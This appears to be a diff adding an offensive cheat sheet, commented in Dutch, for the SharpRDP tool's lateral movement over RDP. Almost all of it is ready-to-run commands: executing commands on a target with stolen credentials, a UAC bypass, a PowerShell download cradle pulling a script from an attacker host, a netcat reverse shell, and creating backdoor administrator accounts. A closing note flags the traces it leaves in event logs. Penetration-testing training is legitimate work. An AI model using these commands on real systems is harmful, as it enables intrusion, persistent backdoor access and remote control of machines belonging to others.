@@ -1,0 +1,34 @@
+# SharpRDP — Lateral movement via RDP (authenticated command execution)
+# Voert commando's uit via RDP sessie zonder interactieve desktop nodig te hebben
+#
+# === Syntax ===
+# SharpRDP.exe computername=TARGET command="COMMAND" username=DOMAIN\USER password=PASS
+#
+# === Belangrijkste opties ===
+# computername=   Doelwit hostname of IP
+# command=        Commando om uit te voeren
+# username=       Gebruikersnaam (DOMAIN\USER)
+# password=       Wachtwoord
+# exec=           Methode: cmd (default) of taskmgr (UAC bypass)
+# connectdriver=  RDP driver (default: mstscax.dll)
+#
+# === Voorbeelden ===
+
+# Basis commando uitvoeren
+SharpRDP.exe computername=TARGET command="cmd /c whoami > C:\temp\out.txt" username=DOMAIN\USER password=PASS
+
+# UAC bypass via taskmgr methode (draait als elevated)
+SharpRDP.exe computername=TARGET command="cmd /c net user hacker P@ss123 /add" username=DOMAIN\USER password=PASS exec=taskmgr
+
+# PowerShell download cradle via RDP
+SharpRDP.exe computername=TARGET command="powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')" username=DOMAIN\USER password=PASS
+
+# Reverse shell via RDP
+SharpRDP.exe computername=TARGET command="cmd /c \\ATTACKER_IP\share\nc.exe ATTACKER_IP 443 -e cmd.exe" username=DOMAIN\USER password=PASS
+
+# Lokale admin account aanmaken
+SharpRDP.exe computername=TARGET command="cmd /c net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add" username=DOMAIN\USER password=PASS exec=taskmgr
+
+# Noot: SharpRDP simuleert toetsaanslagen in de RDP sessie
+# Noot: exec=taskmgr opent Task Manager en typt commando in "new task" dialoog
+# Noot: Laat sporen achter in RDP event logs (Event ID 4624 type 10)
